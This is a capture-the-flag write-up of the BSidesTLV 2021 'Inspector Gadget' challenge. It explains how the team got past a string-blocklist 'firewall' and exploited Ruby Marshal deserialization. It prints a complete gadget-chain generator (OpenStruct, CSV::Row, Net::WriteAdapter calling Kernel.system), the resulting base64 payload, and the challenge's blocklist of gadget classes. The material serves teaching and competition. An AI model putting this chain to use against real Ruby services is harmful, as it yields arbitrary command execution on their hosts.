# Inspector Gadget

* Category: Pwn  
* 450 points  
* Solved by JCTF Team

## Description

Given a docker file with a ruby file in it (given in the appendix) and an
address of a remote server

## Inpection

First let's try to connect to the server and what it is all about:  
```  
$ nc inspector-gadget.ctf.bsidestlv.com 3000

     ###                                                            #####  
      #  #    #  ####  #####  ######  ####  #####  ####  #####     #     #   ##   #####   ####  ###### #####  
      #  ##   # #      #    # #      #    #   #   #    # #    #    #        #  #  #    # #    # #        #  
      #  # #  #  ####  #    # #####  #        #   #    # #    #    #  #### #    # #    # #      #####    #  
      #  #  # #      # #####  #      #        #   #    # #####     #     # ###### #    # #  ### #        #  
      #  #   ## #    # #      #      #    #   #   #    # #   #     #     # #    # #    # #    # #        #  
     ### #    #  ####  #      ######  ####    #    ####  #    #     #####  #    # #####   ####  ######   #

Please insert log object in base64 format (for example
'BAhvOg9EeW5hbWljTG9nCDoLQGxldmVsSSIJSU5GTwY6BkVUOg1AbWVzc2FnZUkiDE1lc3NhZ2UGOwdUOgpAdHlwZUkiCGNzdgY7B1Q='):  
```  
Let's try the example. We get:

```  
level,message  
INFO,Message  
```  
we decoded the example and got:

```  
$echo BAhvOg9EeW5hbWljTG9nCDoLQGxldmVsSSIJSU5GTwY6BkVUOg1AbWVzc2FnZUkiDE1lc3NhZ2UGOwdUOgpAdHlwZUkiCGNzdgY7B1Q= | base64 -d | hexdump -C  
00000000  04 08 6f 3a 0f 44 79 6e  61 6d 69 63 4c 6f 67 08  |..o:.DynamicLog.|  
00000010  3a 0b 40 6c 65 76 65 6c  49 22 09 49 4e 46 4f 06  |:.@levelI".INFO.|  
00000020  3a 06 45 54 3a 0d 40 6d  65 73 73 61 67 65 49 22  |:.ET:.@messageI"|  
00000030  0c 4d 65 73 73 61 67 65  06 3b 07 54 3a 0a 40 74  |.Message.;.T:.@t|  
00000040  79 70 65 49 22 08 63 73  76 06 3b 07 54           |ypeI".csv.;.T|  
```  
Ok, what it is?

We downloaded and extract the docker image and found a ruby script named
index.rb (attached in the appendix below).  
Notice that the flag file is located in the same folder but is never used or
referenced by the ruby script.  
we will get to it later.

In the script we can see that it decodes the base64 input and unmarshals it:  
```ruby  
 serialized_object = Base64.decode64 gets  
 is_blocked = firewall serialized_object  
 puts  
 return puts 'Blocked By The Application Firewall' if is_blocked

 Marshal.load(serialized_object).log rescue nil  
```

Hey, but what is this firewall in the second line above? ?

The name of the challenge implies that we need to use gadget chain in order to
exploit the deserialization and achieve arbitrary command execution.

This technique is decribed [here](https://www.elttam.com/blog/ruby-
deserialization/).

Ruby Gadget Chain TL;DR-ing:  
* When we call to Marshal.load there is a function named "marshal_load" which called automatically if the loaded object implements it.  
* the loaded object contains other objects and is constructed in such a way that triggers a chain of automatic functions (apparently there are many of them) until, in the end of the chain, "system" function is invoked with any command we want (we want "cat flag").  
* In our case the first object in the chain is [Gem::Requirement](https://github.com/rubygems/rubygems/blob/master/lib/rubygems/requirement.rb) which implements marshal_load **and** triggers the next functionin the chain - which is the "each" function - that is called on each object that is given to it.  
* We highly recommend to read the details in the above mentioned article

But can it work here?  
## The Problem  
There are three obstacles in our way to run a succefully gadget chain:  
1. First, the original gadget chain contains the classes **Gem::DependencyList**, **Gem::Source::SpecificFile** and **StubSpecification**, and they are all blocked by the firewall function :-(

2. Second, the original gadget is invoked by marshal_load of **Gem::Requirement**, but in the challenge that function is overridden   
by an empty marshal_load function (which means that upon loading a
Gem::Requirement object nothing will happen):  
```ruby  
class Gem::Requirement  
 def marshal_load(array) end  
end  
```  
3. Moreover, we need also DynamicLog object in order to pass the firewall check.  
## The Solution  
### 1. Bypassing the firewall  
#### Side Quest:  
To pass the first obstacle we tried for a long time "manually fuzzing" the
marshalled object to pass the firewall.  
But that didn't go well and we didn't find special chars or conditions which
will split pass the firewall filtering and will keep the objects valid...

Now what? ![alt
text](https://pbs.twimg.com/media/EW_OfKOWAAACf5z?format=jpg&name=900x900)

The inspector has to look for another gadget chain.  
#### Finding Another Chain:  
[Here](https://github.com/realgam3/ysoserial.rb/blob/main/lib/ysoserial/gadgets/UniversalGadget2.rb)
we found another gadget chain (good work
[realgam3](https://twitter.com/realgam3)!) that doesn't contain the blocked
objects, **except from Gem::Requirement** that also here appears first in the
chain using its marshal_load function.  
### 2. Replacing the First Part of the Chain  
To pass the second obstacle we needed to replace **Gem::Requirement** with
another object that is not blocked by the firewall but implements marshal_load
similarly (by calling the "each" function for each sub-object in it).  
Let's look for another class with marshal_load.  
In the above mentioned [article](https://www.elttam.com/blog/ruby-
deserialization/) there is code that searches the appearance of a function in
other available objects.  
This is the code we took from there:

```ruby  
ObjectSpace.each_object(::Class) do |obj|  
 all_methods = obj.instance_methods + obj.protected_instance_methods +
obj.private_instance_methods

 if all_methods.include? :marshal_load  
   method_origin = obj.instance_method(:marshal_load).inspect[/\((.*)\)/,1] ||
obj.to_s

   puts obj  
   puts "  marshal_load defined by #{method_origin}"  
   puts "  ancestors = #{obj.ancestors}"  
   puts  
 end  
end  
```

We found our longtime friend **Gem::Requirement** as well as **Gem::Version**,
**SimpleDelegator**, **OpenStruct** and more.

**Gem::Version** can't help us, because its [marshal_load
function](https://github.com/rubygems/rubygems/blob/5483c25fdd8f37199231e4c9b172d407304bc862/lib/rubygems/version.rb#L273)
returns an error if the argument (version) is not in a specific format.

Our first attempt was to use **SimpleDelegator**, which its [marshal_load
function](https://github.com/ruby/ruby/blob/d92f09a5eea009fa28cd046e9d0eb698e3d94c5c/lib/delegate.rb#L215)
invokes the variables in its array, exactly like **Gem::Requirement**.  
But unfortunately **SimpleDelegator** is not included by default on the server
in the version of ruby that used in the Docker image (always use the Docker
image if possible!)

Then we moved to try **OpenStruct**.  
Its [marshal_load
function](https://github.com/ruby/ruby/blob/d92f09a5eea009fa28cd046e9d0eb698e3d94c5c/lib/ostruct.rb#L205)
(aliased for "update_to_values" function) invokes each_pair on its hash.  
Looks promising...

We looked for a class that supports "each_pair" function.  
Once bitten, twice shy, we chose
[CSV::Row](https://github.com/ruby/ruby/blob/d92f09a5eea009fa28cd046e9d0eb698e3d94c5c/lib/csv/row.rb#L516),
that we knows that it is explicitly included on the server (because it is used
by DynamicLog log function).  
And the best part with **CSV::Row** is that its "each_pair" function
implementation is alias to the regular "each" function!

So we overridden the marshal_dump function of open struct to return a
**CSV::Row** object:  
```ruby  
class OpenStruct  
 def marshal_dump  
	row = CSV::Row.new(["A"], ["B"])  
	row.instance_variable_set('@row', $t)  
	row  
 end  
end  
```  
### 3. Bypassing the DynamicLog Checks  
That was the easy part.  
We also put the string 'DynamicLog@type@level@message' in extra variable, in
order to include it in the dump data and pass the first check of the firewall
(look at the field @junk we added to object "t" in the chain below)  
```ruby  
t.instance_variable_set('@junk', 'DynamicLog@type@level@message')  
```  
### The Chain  
Long story short, eventually we came up with the code:  
```ruby  
class OpenStruct  
 def marshal_dump  
	row = CSV::Row.new(["A"], ["B"])  
	row.instance_variable_set('@row', $t)  
	row  
 end  
end

def payload  
   Gem::SpecFetcher  
   wa1 = Net::WriteAdapter.new(Kernel, :system)

   rs = Gem::RequestSet.allocate  
   rs.instance_variable_set('@sets', wa1)  
   rs.instance_variable_set('@git_set', "cat flag")

   wa2 = Net::WriteAdapter.new(rs, :resolve)

   Gem::Installer  
   i = Gem::Package::TarReader::Entry.allocate  
   i.instance_variable_set('@read', 0)  
   i.instance_variable_set('@header', "aaa")

   n = Net::BufferedIO.allocate  
   n.instance_variable_set('@io', i)  
   n.instance_variable_set('@debug_output', wa2)

   t = Gem::Package::TarReader.allocate  
   t.instance_variable_set('@io', n)  
	t.instance_variable_set('@junk', 'DynamicLog@type@level@message')

	$t = t  
	r = OpenStruct.new()

   [Gem::SpecFetcher, Gem::Installer, r]  
end

def main  
  pay = payload  
  dump_pay = Base64.encode64 Marshal.dump(pay)  
  puts dump_pay.gsub(/\n/,'')  
end  
```

which creates the payload:  
```  
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOg9PcGVuU3RydWN0bzoNQ1NWOjpSb3cHOhBAaGVhZGVyX3Jvd0Y6CUByb3dvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgc6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7Cm86I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsRBzsSbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIg1jYXQgZmxhZwY7D1Q7FToMcmVzb2x2ZToKQGp1bmtJIiJEeW5hbWljTG9nQHR5cGVAbGV2ZWxAbWVzc2FnZQY7D1Q=  
```

Let's send it to the server:

```  
$nc inspector-gadget.ctf.bsidestlv.com 3000

     ###                                                            #####  
      #  #    #  ####  #####  ######  ####  #####  ####  #####     #     #   ##   #####   ####  ###### #####  
      #  ##   # #      #    # #      #    #   #   #    # #    #    #        #  #  #    # #    # #        #  
      #  # #  #  ####  #    # #####  #        #   #    # #    #    #  #### #    # #    # #      #####    #  
      #  #  # #      # #####  #      #        #   #    # #####     #     # ###### #    # #  ### #        #  
      #  #   ## #    # #      #      #    #   #   #    # #   #     #     # #    # #    # #    # #        #  
     ### #    #  ####  #      ######  ####    #    ####  #    #     #####  #    # #####   ####  ######   #

Please insert log object in base64 format (for example
'BAhvOg9EeW5hbWljTG9nCDoLQGxldmVsSSIJSU5GTwY6BkVUOg1AbWVzc2FnZUkiDE1lc3NhZ2UGOwdUOgpAdHlwZUkiCGNzdgY7B1Q='):  
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOg9PcGVuU3RydWN0bzoNQ1NWOjpSb3cHOhBAaGVhZGVyX3Jvd0Y6CUByb3dvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgc6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7Cm86I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsRBzsSbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIg1jYXQgZmxhZwY7D1Q7FToMcmVzb2x2ZToKQGp1bmtJIiJEeW5hbWljTG9nQHR5cGVAbGV2ZWxAbWVzc2FnZQY7D1Q=

BSidesTLV2021{You_H4v3_Off1c14lly_B3c4m3_Gadget_Hunter}  
```  
We are inspector gadget now!  
## Appendix  
index.rb:  
```ruby  
#!/usr/bin/env ruby  
# frozen_string_literal: true

require 'csv'  
require 'json'  
require 'base64'

class DynamicLog  
 def initialize(level, message, type)  
   @level = level  
   @message = message  
   @type = type  
 end

 def log  
   obj = { :level => @level, :message => @message }  
   message =  
     case @type  
     when 'json'  
       JSON.dump obj  
     when 'csv'  
       CSV.generate do |csv|  
         csv << obj.keys  
         csv << obj.values  
       end  
     else  
       "[#{@level}] #{@message}"  
     end  
   puts message  
 end  
end

class Gem::Requirement  
 def marshal_load(array) end  
end

def firewall(input)  
 %w[DynamicLog @type @level @message].each do |word|  
   return true unless input.include? word  
 end

 %w[  
   Gem::Requirement Gem::DependencyList Gem::Requirement  
   Gem::StubSpecification Gem::Source::SpecificFile  
   ActiveModel::AttributeMethods::ClassMethods::CodeGenerator  
   ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy  
 ].each do |word|  
   return true if input.include? word  
 end  
 false  
end

def main  
 puts %(  
     ###                                                            #####  
      #  #    #  ####  #####  ######  ####  #####  ####  #####     #     #   ##   #####   ####  ###### #####  
      #  ##   # #      #    # #      #    #   #   #    # #    #    #        #  #  #    # #    # #        #  
      #  # #  #  ####  #    # #####  #        #   #    # #    #    #  #### #    # #    # #      #####    #  
      #  #  # #      # #####  #      #        #   #    # #####     #     # ###### #    # #  ### #        #  
      #  #   ## #    # #      #      #    #   #   #    # #   #     #     # #    # #    # #    # #        #  
     ### #    #  ####  #      ######  ####    #    ####  #    #     #####  #    # #####   ####  ######   #  
  )  
 log =
'BAhvOg9EeW5hbWljTG9nCDoLQGxldmVsSSIJSU5GTwY6BkVUOg1AbWVzc2FnZUkiDE1lc3NhZ2UGOwdUOgpAdHlwZUkiCGNzdgY7B1Q='  
 puts "Please insert log object in base64 format (for example '#{log}'):"  
 serialized_object = Base64.decode64 gets  
 is_blocked = firewall serialized_object  
 puts  
 return puts 'Blocked By The Application Firewall' if is_blocked

 Marshal.load(serialized_object).log rescue nil  
end

main

Original writeup (https://jctf.team/).